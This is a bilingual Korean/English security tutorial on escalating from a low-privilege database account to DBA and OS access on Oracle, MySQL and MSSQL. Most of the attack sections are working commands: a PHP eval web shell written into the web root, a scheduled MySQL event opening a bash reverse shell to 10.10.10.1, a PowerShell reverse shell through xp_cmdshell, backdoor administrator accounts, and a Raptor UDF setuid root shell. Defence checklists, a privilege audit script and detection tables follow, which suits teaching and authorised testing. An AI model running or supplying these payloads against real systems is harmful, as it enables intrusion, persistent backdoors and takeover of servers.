> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# DB 권한 상승 — 저권한 계정에서 DBA/OS까지

## 0. 초보자를 위한 개념 이해

### DB 권한 상승이란?

**DB 권한 상승**은 제한된 DB 사용자 계정에서 더 높은 권한을 획득하는 과정입니다.

```
일반 DB 사용자 권한:
  SELECT, INSERT, UPDATE (특정 테이블만)
  자신이 생성한 객체만 수정
  → 공격자가 접근 가능한 데이터 제한

DBA(Database Administrator) 권한:
  모든 테이블 접근
  사용자 계정 생성/삭제
  감사 로그 접근
  → 공격자가 전체 DB 장악

OS 수준 권한 (DB를 통해):
  파일 읽기/쓰기 (DB가 실행 중인 OS)
  OS 명령 실행
  → 공격자가 DB 서버 자체를 장악
```

### 각 DB의 "위험한 기능들"

```
MySQL/MariaDB:
  SELECT ... INTO OUTFILE '/var/www/html/shell.php'
  → 웹 루트에 PHP 파일 쓰기 = 웹쉘 업로드!
  
  LOAD_FILE('/etc/passwd')
  → 서버의 파일 읽기
  
  CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so'
  → UDF(사용자 정의 함수)로 OS 명령 실행
  
Oracle:
  DBMS_SCHEDULER.CREATE_JOB → OS 명령 예약 실행
  UTL_FILE → 파일 읽기/쓰기
  JAVA_LANG.RUNTIME.EXEC → Java로 OS 명령 실행
  
MSSQL:
  xp_cmdshell 'whoami' → OS 명령 직접 실행 (기본 비활성)
  OPENROWSET → 원격 파일/서버 접근
```

### DB 권한 체계 이해

```
Oracle DB 권한 체계:
  Privilege (권한)     : CREATE SESSION, SELECT ANY TABLE 등 개별 권한
  Role (역할)          : CONNECT, DBA 등 권한 묶음
  Granted Role        : 계정에 부여된 역할
  
  DBA 역할 = 거의 모든 권한 (Oracle의 최고 권한)

MySQL 권한 체계:
  Global Privileges   : 모든 DB에 적용
  Database Privileges : 특정 DB에 적용
  Table Privileges    : 특정 테이블에 적용
  Column Privileges   : 특정 컬럼에 적용
  
  root@localhost = 최고 권한 (MySQL의 슈퍼유저)
  FILE 권한 = 파일 읽기/쓰기 가능 (중요!)
```

---

## 1. 권한 상승 경로

```
일반 계정
    ↓  역할(ROLE) 남용
    ↓  저장 프로시저 취약점
    ↓  SQLi → DB 계정 탈취
DBA 계정
    ↓  UDF / Job / extproc
    ↓  파일 읽기/쓰기
OS 쉘 (DB 서비스 계정 권한)
    ↓  로컬 권한 상승 (별도 단계)
root / SYSTEM
```

---

## 2. Oracle 권한 상승

### Oracle DB 권한 상승 기법 개요

Oracle에서 권한 상승은 주로 다음 방법으로 이루어집니다:

```
1. 과도 부여된 시스템 권한 악용
   CREATE ANY PROCEDURE → 모든 사용자의 프로시저 덮어쓰기
   EXECUTE ANY PROCEDURE → SYS 소유 프로시저 실행
   
2. 취약한 PL/SQL 패키지/프로시저
   AUTHID CURRENT_USER vs AUTHID DEFINER 차이 악용
   
3. 내장 패키지 취약점 (CVE)
   DBMS_XMLQUERY, UTL_FILE, DBMS_SCHEDULER
   
4. 동적 SQL 인젝션
   EXECUTE IMMEDIATE에 사용자 입력 포함
```

### 2-1. 현재 권한 및 역할 확인

```sql
-- 현재 사용자
SELECT USER FROM DUAL;

-- 현재 사용자의 시스템 권한
SELECT PRIVILEGE FROM SESSION_PRIVS;

-- 현재 사용자의 역할
SELECT GRANTED_ROLE FROM SESSION_ROLES;

-- DBA 역할 보유 사용자 목록
SELECT GRANTEE FROM DBA_ROLE_PRIVS WHERE GRANTED_ROLE = 'DBA';

-- 실행 가능한 프로시저 목록
SELECT OBJECT_NAME, OBJECT_TYPE FROM ALL_OBJECTS
WHERE OBJECT_TYPE IN ('PROCEDURE','FUNCTION','PACKAGE')
AND OWNER != USER;
```

### 2-2. CREATE ANY PROCEDURE 악용


```sql
-- CREATE ANY PROCEDURE 권한이 있으면 SYS 소유 프로시저 덮어쓰기 가능
-- 대상: 취약한 Oracle 버전 (11.2 이하 일부)

-- 권한 확인
SELECT PRIVILEGE FROM SESSION_PRIVS WHERE PRIVILEGE LIKE '%PROCEDURE%';

-- SYS.GRANT_DBA 프로시저 악용 예시 (패치 전 버전)
CREATE OR REPLACE PROCEDURE sys.evil_proc AUTHID CURRENT_USER AS
BEGIN
  EXECUTE IMMEDIATE 'GRANT DBA TO ' || USER;
END;
/
```

### 2-3. DBMS_XMLQUERY / DBMS_METADATA 인젝션


```sql
-- DBMS_XMLQUERY를 통한 권한 상승 (CVE-2010-3600 등)
-- 파라미터 인젝션으로 SYS 컨텍스트에서 쿼리 실행

-- 패치 확인: DBA_REGISTRY에서 컴포넌트 버전 확인
SELECT COMP_NAME, VERSION, STATUS FROM DBA_REGISTRY
WHERE COMP_NAME LIKE '%XML%';
```

### 2-4. 저장 프로시저 내 SQLi (Second-Order)


```sql
-- 프로시저 내부에 동적 SQL이 있을 경우
-- 입력값이 검증 없이 EXECUTE IMMEDIATE에 들어가는 패턴

-- 취약한 예시
CREATE OR REPLACE PROCEDURE get_user_data(p_name IN VARCHAR2) AS
  v_sql VARCHAR2(200);
BEGIN
  v_sql := 'SELECT * FROM users WHERE name = ''' || p_name || '''';
  EXECUTE IMMEDIATE v_sql;  -- SQLi 가능
END;

-- 공격
EXEC get_user_data(q'[' UNION SELECT 1,user,3 FROM dual--]');
```

---

## 3. MySQL 권한 상승

### 3-1. 현재 권한 확인


```sql
-- 현재 사용자 권한
SHOW GRANTS FOR CURRENT_USER();

-- 글로벌 권한 확인 (SUPER, FILE 등)
SELECT user, Super_priv, File_priv, Execute_priv
FROM mysql.user WHERE user = CURRENT_USER();
```

### 3-2. MySQL 취약한 설정 악용


```sql
-- 1. FILE 권한 → 웹쉘 / 설정 파일 읽기
SELECT LOAD_FILE('/etc/mysql/my.cnf');
SELECT '<?php @eval($_POST[0]);?>' INTO OUTFILE '/var/www/html/sh.php';

-- 2. 함수 경로 트릭 (secure_file_priv = '' 일 때)
SELECT @@datadir;       -- /var/lib/mysql/
SELECT @@basedir;       -- /usr/

-- 3. 이벤트 스케줄러 악용 (EVENT 권한)
SET GLOBAL event_scheduler = ON;
CREATE EVENT backdoor
ON SCHEDULE EVERY 1 SECOND
DO CALL sys_exec('bash -i >& /dev/tcp/10.10.10.1/4444 0>&1');
```

### 3-3. MySQL 8.x 계정 조작


```sql
-- 플러그인 우회 (caching_sha2_password → mysql_native_password)
ALTER USER 'root'@'localhost'
  IDENTIFIED WITH mysql_native_password BY 'newpass';

-- 백도어 계정 생성 (root 접근 후)
CREATE USER 'backdoor'@'%' IDENTIFIED BY 'P@ssw0rd!';
GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%' WITH GRANT OPTION;
FLUSH PRIVILEGES;
```

### 3-4. Raptor_UDF2 기법 (고전 MySQL 권한 상승)


UDF(User Defined Function) 인젝션은 MySQL에서 공유 라이브러리를 로드하여 OS 수준 명령 실행 권한을 얻는 기법입니다. `FILE` 권한이 있으면 `sys_exec()` 함수를 생성하여 OS 명령을 실행할 수 있습니다.

```bash
# 도구 준비
git clone https://github.com/1N3/PrivEsc.git
gcc -shared -fPIC PrivEsc/mysql/raptor_udf2.c -o raptor_udf2.so

# MySQL 로그인 후
mysql -u root -p
```


```sql
USE mysql;
CREATE TABLE foo(line BLOB);
INSERT INTO foo VALUES(LOAD_FILE('/tmp/raptor_udf2.so'));
SELECT * FROM foo INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';
CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';
SELECT do_system('id > /tmp/out && chmod 755 /tmp/out');
SELECT do_system('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash');
```

---

## 4. MSSQL 권한 상승

### 4-1. xp_cmdshell 활성화 및 명령 실행


```sql
-- xp_cmdshell 활성화 (sysadmin 필요)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- 명령 실행
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'net user hacker P@ss123 /add';
EXEC xp_cmdshell 'net localgroup administrators hacker /add';

-- 리버스 쉘
EXEC xp_cmdshell 'powershell -nop -c "$c=New-Object Net.Sockets.TCPClient(\"10.10.10.1\",4444);..."';
```

### 4-2. Linked Server 악용


```sql
-- 링크드 서버 목록
SELECT name, provider FROM sys.servers WHERE is_linked = 1;

-- 원격 DB에서 명령 실행
EXEC ('xp_cmdshell ''whoami''') AT [linked_server_name];

-- 링크드 서버 체인으로 권한 상승
-- A서버(저권한) → B서버(고권한) 로 이동 가능
```

### 4-3. Impersonation (사용자 가장)


```sql
-- 가장할 수 있는 사용자 확인
SELECT DISTINCT b.name
FROM sys.database_permissions a
JOIN sys.database_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- 가장 실행 후 권한 상승
EXECUTE AS LOGIN = 'sa';
EXEC xp_cmdshell 'whoami';
REVERT;
```

---

## 5. 자동화 — DB 권한 점검 도구

```python
import pymysql
import cx_Oracle
import argparse
import sys
from dataclasses import dataclass, field

@dataclass
class PrivEscResult:
    user: str
    db_type: str
    dangerous_privs: list[str] = field(default_factory=list)
    escalation_paths: list[str] = field(default_factory=list)

def check_mysql_privs(host: str, user: str, password: str) -> PrivEscResult:
    result = PrivEscResult(user=user, db_type="MySQL")
    try:
        conn = pymysql.connect(host=host, user=user, password=password, db='mysql')
        cur = conn.cursor()

        # 위험 권한 확인
        danger_privs = ["Super_priv", "File_priv", "Execute_priv",
                        "Create_routine_priv", "Alter_routine_priv",
                        "Create_user_priv", "Repl_slave_priv"]
        cur.execute(f"SELECT {','.join(danger_privs)} FROM user WHERE user=%s", (user,))
        row = cur.fetchone()
        if row:
            for i, priv in enumerate(danger_privs):
                if row[i] == 'Y':
                    result.dangerous_privs.append(priv)

        # 권한 상승 경로 판단
        if "File_priv" in result.dangerous_privs:
            result.escalation_paths.append("FILE priv → LOAD_FILE / INTO OUTFILE")
        if "Super_priv" in result.dangerous_privs:
            result.escalation_paths.append("SUPER priv → UDF 로드, 이벤트 스케줄러")
        if "Execute_priv" in result.dangerous_privs:
            result.escalation_paths.append("EXECUTE priv → UDF sys_exec 실행 가능")

        # UDF 함수 존재 확인
        cur.execute("SELECT name FROM mysql.func WHERE ret=0")
        udfs = [r[0] for r in cur.fetchall()]
        if udfs:
            result.escalation_paths.append(f"UDF 함수 발견: {udfs}")

        cur.close()
        conn.close()
    except Exception as e:
        result.escalation_paths.append(f"연결 실패: {e}")
    return result

def print_result(r: PrivEscResult) -> None:
    print(f"\n[{r.db_type}] 사용자: {r.user}")
    print(f"  위험 권한: {r.dangerous_privs or '없음'}")
    if r.escalation_paths:
        print("  권한 상승 경로:")
        for path in r.escalation_paths:
            print(f"    → {path}")
    else:
        print("  권한 상승 경로: 발견 없음")

def main() -> None:
    parser = argparse.ArgumentParser(description="DB 권한 점검 도구")
    parser.add_argument("--host", required=True)
    parser.add_argument("--user", required=True)
    parser.add_argument("--password", required=True)
    parser.add_argument("--db-type", choices=["mysql", "oracle"], default="mysql")
    args = parser.parse_args()

    if args.db_type == "mysql":
        result = check_mysql_privs(args.host, args.user, args.password)
        print_result(result)
    else:
        print("Oracle 점검은 DBA 계정 필요")

if __name__ == "__main__":
    main()
```

---

## 6. 권한 상승 방어

```
공통 원칙:
  □ 최소 권한 원칙 — 앱 계정에 SELECT/INSERT만 부여
  □ DBA/SA 계정 일상적 사용 금지
  □ 저장 프로시저 AUTHID DEFINER 대신 CURRENT_USER 사용
  □ 동적 SQL 파라미터 바인딩 필수 (문자열 연결 금지)

Oracle 전용:
  □ PUBLIC 역할에서 불필요 패키지 REVOKE
  □ EXECUTE ANY PROCEDURE 권한 제거
  □ Java 스토어드 프로시저 불필요 시 비활성화

MySQL 전용:
  □ plugin_dir 권한을 root만 쓰기 가능으로 제한
  □ event_scheduler 기본 OFF
  □ FILE 권한 최소화, secure_file_priv 설정

MSSQL 전용:
  □ xp_cmdshell 기본 비활성화 유지
  □ Linked Server 최소화 및 보안 설정 강화
  □ Impersonation 권한 감사
```

---

<!-- detect-validate-23 -->
## DB 권한상승 탐지와 방어 검증

DB 권한상승은 *어떻게 저권한에서 DBA/OS 로 올라가는가*를 다루지만, 방어자는 **각 경로가 권한 부여·실행 로그 어디에 흔적을 남기는가**와 **권한 분리가 실제로 경계를 유지하는가**를 검증해야 한다.

### 공격 → 계층 → 통제(방어자) → 탐지 신호

| 기법 | 노리는 계층 | 1차 통제(방어자) | 탐지 신호 |
|---|---|---|---|
| 과도 권한(FILE/SUPER) | 권한 모델 | 최소권한, 권한 감사 | 앱계정의 DBA 권한 보유 |
| 저장 프로시저/UDF | 코드 실행 | 정의자 권한 제한 | 비정상 프로시저 생성 |
| DBA→OS(xp_cmdshell 등) | DB→OS 경계 | 기능 비활성화 | OS 명령 실행 쿼리 |
| 자격증명 재사용 | 인증 | 계정 분리, 회전 | 동일 자격증명 다계정 |

### 방어 검증 (직접 확인)

```sql
-- 과도 권한 계정을 점검해 권한상승 표면을 검증(소유 DB)
SELECT user, host FROM mysql.user
WHERE File_priv='Y' OR Super_priv='Y' OR Grant_priv='Y';
-- 애플리케이션 계정이 위 권한을 가지면 최소권한 위반 → 권한상승 가능
-- 정상: 앱 계정은 특정 스키마의 SELECT/INSERT/UPDATE/DELETE 로 한정
```

> 검증은 반드시 **소유한 DB·통제 환경**에서만. "권한 분리 설정"과 "실제로 경계가 유지된다"는 다르다 — 저권한 계정으로 권한상승 PoC 를 재현해 차단·로깅되는지 확인한다([[03_System_Hacking]], [[13_SOC_Blue_Team]]).

**최신 기법·통제 (2025–2026):**
- DB 권한·링크서버·UDF 남용으로 상승/OS접근 — 최소권한·기능 비활성으로 방어. 검증: 상승이 감사로그에 남는지 재현(소유 DB)([[26_Linux_Hardening]])
- 서비스계정 격리 — 강제되는지 확인

---

<a name="english"></a>

# DB Privilege Escalation — From Low-Privilege Account to DBA/OS

## 1. Privilege Escalation Path

```
Regular Account
    ↓  Role (ROLE) abuse
    ↓  Stored procedure vulnerabilities
    ↓  SQLi → DB account takeover
DBA Account
    ↓  UDF / Job / extproc
    ↓  File read/write
OS Shell (DB service account privileges)
    ↓  Local privilege escalation (separate phase)
root / SYSTEM
```

---

## 2. Oracle Privilege Escalation

### 2-1. Check Current Privileges and Roles

```sql
-- Current user
SELECT USER FROM DUAL;

-- System privileges of current user
SELECT PRIVILEGE FROM SESSION_PRIVS;

-- Roles of current user
SELECT GRANTED_ROLE FROM SESSION_ROLES;

-- Users with DBA role
SELECT GRANTEE FROM DBA_ROLE_PRIVS WHERE GRANTED_ROLE = 'DBA';

-- List of executable procedures
SELECT OBJECT_NAME, OBJECT_TYPE FROM ALL_OBJECTS
WHERE OBJECT_TYPE IN ('PROCEDURE','FUNCTION','PACKAGE')
AND OWNER != USER;
```

### 2-2. Abusing CREATE ANY PROCEDURE

```sql
-- With CREATE ANY PROCEDURE privilege, can overwrite SYS-owned procedures
-- Target: vulnerable Oracle versions (some 11.2 and below)

-- Check privilege
SELECT PRIVILEGE FROM SESSION_PRIVS WHERE PRIVILEGE LIKE '%PROCEDURE%';

-- SYS.GRANT_DBA procedure abuse example (pre-patch versions)
CREATE OR REPLACE PROCEDURE sys.evil_proc AUTHID CURRENT_USER AS
BEGIN
  EXECUTE IMMEDIATE 'GRANT DBA TO ' || USER;
END;
/
```

### 2-3. DBMS_XMLQUERY / DBMS_METADATA Injection

```sql
-- Privilege escalation via DBMS_XMLQUERY (CVE-2010-3600, etc.)
-- Execute queries in SYS context via parameter injection

-- Check patch: verify component versions in DBA_REGISTRY
SELECT COMP_NAME, VERSION, STATUS FROM DBA_REGISTRY
WHERE COMP_NAME LIKE '%XML%';
```

### 2-4. SQLi Inside Stored Procedures (Second-Order)

```sql
-- When a procedure contains dynamic SQL
-- Pattern where input values go directly into EXECUTE IMMEDIATE without validation

-- Vulnerable example
CREATE OR REPLACE PROCEDURE get_user_data(p_name IN VARCHAR2) AS
  v_sql VARCHAR2(200);
BEGIN
  v_sql := 'SELECT * FROM users WHERE name = ''' || p_name || '''';
  EXECUTE IMMEDIATE v_sql;  -- SQLi possible
END;

-- Attack
EXEC get_user_data(q'[' UNION SELECT 1,user,3 FROM dual--]');
```

---

## 3. MySQL Privilege Escalation

### 3-1. Check Current Privileges

```sql
-- Current user privileges
SHOW GRANTS FOR CURRENT_USER();

-- Check global privileges (SUPER, FILE, etc.)
SELECT user, Super_priv, File_priv, Execute_priv
FROM mysql.user WHERE user = CURRENT_USER();
```

### 3-2. Exploiting Vulnerable MySQL Configuration

```sql
-- 1. FILE privilege → web shell / read config files
SELECT LOAD_FILE('/etc/mysql/my.cnf');
SELECT '<?php @eval($_POST[0]);?>' INTO OUTFILE '/var/www/html/sh.php';

-- 2. Function path trick (when secure_file_priv = '')
SELECT @@datadir;       -- /var/lib/mysql/
SELECT @@basedir;       -- /usr/

-- 3. Event scheduler abuse (requires EVENT privilege)
SET GLOBAL event_scheduler = ON;
CREATE EVENT backdoor
ON SCHEDULE EVERY 1 SECOND
DO CALL sys_exec('bash -i >& /dev/tcp/10.10.10.1/4444 0>&1');
```

### 3-3. MySQL 8.x Account Manipulation

```sql
-- Plugin bypass (caching_sha2_password → mysql_native_password)
ALTER USER 'root'@'localhost'
  IDENTIFIED WITH mysql_native_password BY 'newpass';

-- Create backdoor account (after gaining root access)
CREATE USER 'backdoor'@'%' IDENTIFIED BY 'P@ssw0rd!';
GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%' WITH GRANT OPTION;
FLUSH PRIVILEGES;
```

### 3-4. Raptor_UDF2 Technique (Classic MySQL Privilege Escalation)

UDF (User Defined Function) injection loads a shared library in MySQL to obtain OS-level command execution. With FILE privilege, the `sys_exec()` function can be created to execute OS commands.

```bash
# Prepare tool
git clone https://github.com/1N3/PrivEsc.git
gcc -shared -fPIC PrivEsc/mysql/raptor_udf2.c -o raptor_udf2.so

# After MySQL login
mysql -u root -p
```

```sql
USE mysql;
CREATE TABLE foo(line BLOB);
INSERT INTO foo VALUES(LOAD_FILE('/tmp/raptor_udf2.so'));
SELECT * FROM foo INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';
CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';
SELECT do_system('id > /tmp/out && chmod 755 /tmp/out');
SELECT do_system('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash');
```

---

## 4. MSSQL Privilege Escalation

### 4-1. Enabling xp_cmdshell and Command Execution

```sql
-- Enable xp_cmdshell (requires sysadmin)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Execute commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'net user hacker P@ss123 /add';
EXEC xp_cmdshell 'net localgroup administrators hacker /add';

-- Reverse shell
EXEC xp_cmdshell 'powershell -nop -c "$c=New-Object Net.Sockets.TCPClient(\"10.10.10.1\",4444);..."';
```

### 4-2. Linked Server Abuse

```sql
-- List linked servers
SELECT name, provider FROM sys.servers WHERE is_linked = 1;

-- Execute commands on remote DB
EXEC ('xp_cmdshell ''whoami''') AT [linked_server_name];

-- Privilege escalation via linked server chain
-- Move from server A (low privilege) → server B (high privilege)
```

### 4-3. Impersonation

```sql
-- Check impersonatable users
SELECT DISTINCT b.name
FROM sys.database_permissions a
JOIN sys.database_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- Execute as different user and escalate privileges
EXECUTE AS LOGIN = 'sa';
EXEC xp_cmdshell 'whoami';
REVERT;
```

---

## 5. Automation — DB Privilege Audit Tool

```python
import pymysql
import cx_Oracle
import argparse
import sys
from dataclasses import dataclass, field

@dataclass
class PrivEscResult:
    user: str
    db_type: str
    dangerous_privs: list[str] = field(default_factory=list)
    escalation_paths: list[str] = field(default_factory=list)

def check_mysql_privs(host: str, user: str, password: str) -> PrivEscResult:
    result = PrivEscResult(user=user, db_type="MySQL")
    try:
        conn = pymysql.connect(host=host, user=user, password=password, db='mysql')
        cur = conn.cursor()

        # Check dangerous privileges
        danger_privs = ["Super_priv", "File_priv", "Execute_priv",
                        "Create_routine_priv", "Alter_routine_priv",
                        "Create_user_priv", "Repl_slave_priv"]
        cur.execute(f"SELECT {','.join(danger_privs)} FROM user WHERE user=%s", (user,))
        row = cur.fetchone()
        if row:
            for i, priv in enumerate(danger_privs):
                if row[i] == 'Y':
                    result.dangerous_privs.append(priv)

        # Determine escalation paths
        if "File_priv" in result.dangerous_privs:
            result.escalation_paths.append("FILE priv → LOAD_FILE / INTO OUTFILE")
        if "Super_priv" in result.dangerous_privs:
            result.escalation_paths.append("SUPER priv → UDF loading, event scheduler")
        if "Execute_priv" in result.dangerous_privs:
            result.escalation_paths.append("EXECUTE priv → UDF sys_exec callable")

        # Check for existing UDF functions
        cur.execute("SELECT name FROM mysql.func WHERE ret=0")
        udfs = [r[0] for r in cur.fetchall()]
        if udfs:
            result.escalation_paths.append(f"UDF functions found: {udfs}")

        cur.close()
        conn.close()
    except Exception as e:
        result.escalation_paths.append(f"Connection failed: {e}")
    return result

def print_result(r: PrivEscResult) -> None:
    print(f"\n[{r.db_type}] User: {r.user}")
    print(f"  Dangerous privileges: {r.dangerous_privs or 'None'}")
    if r.escalation_paths:
        print("  Escalation paths:")
        for path in r.escalation_paths:
            print(f"    → {path}")
    else:
        print("  Escalation paths: None found")

def main() -> None:
    parser = argparse.ArgumentParser(description="DB privilege audit tool")
    parser.add_argument("--host", required=True)
    parser.add_argument("--user", required=True)
    parser.add_argument("--password", required=True)
    parser.add_argument("--db-type", choices=["mysql", "oracle"], default="mysql")
    args = parser.parse_args()

    if args.db_type == "mysql":
        result = check_mysql_privs(args.host, args.user, args.password)
        print_result(result)
    else:
        print("Oracle audit requires DBA account")

if __name__ == "__main__":
    main()
```

---

## 6. Privilege Escalation Defense

```
Common Principles:
  □ Principle of least privilege — grant only SELECT/INSERT to app accounts
  □ Never use DBA/SA accounts for daily operations
  □ Use AUTHID CURRENT_USER instead of DEFINER in stored procedures
  □ Mandatory parameter binding for dynamic SQL (no string concatenation)

Oracle-specific:
  □ REVOKE unnecessary packages from PUBLIC role
  □ Remove EXECUTE ANY PROCEDURE privilege
  □ Disable Java stored procedures if not needed

MySQL-specific:
  □ Restrict plugin_dir write access to root only
  □ Default event_scheduler to OFF
  □ Minimize FILE privilege, configure secure_file_priv

MSSQL-specific:
  □ Keep xp_cmdshell disabled by default
  □ Minimize Linked Servers and strengthen security configuration
  □ Audit Impersonation privileges
```

<!-- detect-validate-23 -->
## DB Privilege Escalation Detection and Defense Validation

DB privilege escalation describes *how to go from low-priv to DBA/OS*, but defenders must verify **where each path leaves traces (grants, execution logs)** and **whether privilege separation actually holds the boundary**.

### Attack -> Layer -> Control (defender) -> Detection signal

| Technique | Targeted layer | Primary control (defender) | Detection signal |
|---|---|---|---|
| Excess privilege (FILE/SUPER) | Privilege model | Least privilege, grant audit | App account holding DBA rights |
| Stored procedure/UDF | Code execution | Restrict definer rights | Abnormal procedure creation |
| DBA->OS (xp_cmdshell, etc.) | DB->OS boundary | Disable the feature | OS-command execution queries |
| Credential reuse | Authentication | Account separation, rotation | Same credential across accounts |

### Defense validation (verify directly)

```sql
-- Audit over-privileged accounts to validate the escalation surface (own DB)
SELECT user, host FROM mysql.user
WHERE File_priv='Y' OR Super_priv='Y' OR Grant_priv='Y';
-- If an application account holds these, it violates least privilege -> escalation possible
-- Normal: app accounts limited to SELECT/INSERT/UPDATE/DELETE on specific schemas
```

> Validate only on **owned DBs / controlled environments**. "Configured privilege separation" differs from "the boundary actually holds" — reproduce an escalation PoC from a low-priv account to confirm blocking/logging ([[03_System_Hacking]], [[13_SOC_Blue_Team]]).
